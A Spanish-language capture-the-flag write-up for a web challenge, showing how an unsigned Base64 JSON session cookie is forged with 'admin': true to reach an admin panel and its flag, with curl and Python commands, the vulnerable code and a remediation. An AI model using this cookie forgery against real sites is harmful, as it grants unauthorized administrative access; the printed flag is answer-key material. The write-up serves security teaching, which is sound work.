# Apuntes 2

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 100 |
| **Evento** | Kernel CTF — AHAU Team |
| **Autor del reto** | Lychi3 |
| **Objetivo** | `http://3.236.190.110` |
| **Descripción** | *"Sigue mirando..."* |
| **Vulnerabilidad** | Manipulación de cookie sin firma → escalada de privilegios a administrador |
| **CWE** | CWE-565 (Reliance on Cookies without Validation and Integrity Checking), CWE-639 |
| **OWASP** | A01:2021 – Broken Access Control |

## 1. Reconocimiento

De [Apuntes 1](../apuntes-1/README.md) se sabe que la cookie `session` es JSON en Base64 con un campo `"admin": false`. Con una cuenta normal, `/admin` responde:

```text
$ curl -s -b cj.txt -L http://3.236.190.110/admin | grep -i permisos
    <p>No tienes permisos de administrador.</p>
```

## 2. Análisis

Si el servidor decide quién es admin leyendo el campo `admin` **de la cookie** y la cookie no tiene firma, el cliente puede cambiarlo.

## 3. Intentos fallidos

Se asumió primero que era una cookie de Flask firmada y se intentó forjarla con `flask-unsign`, usando la `SECRET_KEY` filtrada en [Development](../development/README.md):

```text
$ FORGED=$(flask-unsign --sign --cookie "{'user': 'h2r6b', 'admin': True, 'note_id': 1}" --secret 'a1b2c3d4e5f6')
$ curl -s -b "session=$FORGED" -L http://3.236.190.110/admin | grep -iE "AHAU"
(sin resultado)
```

También se lanzó fuerza bruta del secreto con `rockyou.txt`, que se abortó:

```text
$ flask-unsign --unsign --cookie "$SESSION" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
[*] Starting brute-forcer with 8 threads..
[!] Aborted.
```

Ninguno de los dos funcionó:

- `flask-unsign --sign` genera una cookie con formato `payload.timestamp.firma`. La aplicación espera **solo Base64**, así que su `base64.b64decode()` falla con los puntos y la sesión se toma como inválida.
- La fuerza bruta no tiene sentido porque **no hay firma que romper**.

> **Lección:** antes de atacar la firma, confirmar si existe. Una cookie sin puntos no es *itsdangerous*.

## 4. Explotación

Se construye la cookie a mano con `admin: true`:

```bash
COOKIE=$(python3 -c "import base64,json; print(base64.b64encode(json.dumps(
{'user':'h2r6b','admin':True,'token':'x','note_id':1}).encode()).decode())")
echo "$COOKIE"
# eyJ1c2VyIjogImgycjZiIiwgImFkbWluIjogdHJ1ZSwgInRva2VuIjogIngiLCAibm90ZV9pZCI6IDF9

curl -s -b "session=$COOKIE" -L http://3.236.190.110/admin
```

Respuesta del panel:

```html
<title>NotasSeguras - Admin</title>
<h2>Panel de Administracion</h2>
<p>Bienvenido al panel de administracion.</p>
<div class="flag">AHAU{n3v3r_f0rg3t_th3_s1gn4tur3}</div>

<h2>Herramientas</h2>
<a href="/admin/tools">Ping - Diagnostico de red</a>
<a href="/admin/reports">Reportes del sistema</a>

<h2>Notas de usuarios</h2>
<a href="/admin/note/11">#11 - Nota de h2r6b</a>
```

Además de la bandera, el panel expone tres superficies nuevas para los siguientes retos:

| Superficie | Reto |
|---|---|
| `/admin/note/<id>` | [Apuntes 3 – IDOR](../apuntes-3/README.md) |
| `/admin/tools` | [Apuntes 4 – Command Injection](../apuntes-4/README.md) |
| `/admin/reports` | [Apuntes 5 – LFI](../apuntes-5/README.md) |

## 5. Causa raíz

```python
def decode_session(raw):
    try:
        return json.loads(base64.b64decode(raw))   # sin verificar integridad
    except Exception:
        return None

@app.route("/admin")
def admin_panel():
    s = decode_session(request.cookies.get("session", ""))
    if not s:
        return redirect("/login")
    if not s.get("admin"):                          # el rol lo decide el cliente
        return render_template("forbidden.html"), 403
    ...
    return render_template("admin.html", flag=FLAG2, ...)
```

El servidor **confía en un dato que controla el cliente** para decidir la autorización.

## 6. Impacto

Cualquier usuario registrado se vuelve administrador, y todas las funciones del panel quedan expuestas: lectura de notas ajenas, ejecución de comandos y lectura de archivos.

## 7. Remediación

- El rol del usuario debe vivir **en el servidor** (base de datos) y consultarse en cada petición.
- La sesión debe estar firmada (sesión nativa de Flask con `SECRET_KEY` fuerte) o ser solo un ID opaco.

```python
from functools import wraps
from flask import session, abort

def admin_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        user = db.get_user(session.get("user_id"))
        if not user or user.role != "admin":
            abort(403)
        return f(*a, **kw)
    return wrapper

@app.route("/admin")
@admin_required
def admin_panel():
    ...
```

## 🚩 Flag

```text
AHAU{n3v3r_f0rg3t_th3_s1gn4tur3}
```

---
[⬅ Apuntes 1](../apuntes-1/README.md) · [Índice](../../README.md) · [Apuntes 3 ➡](../apuntes-3/README.md)
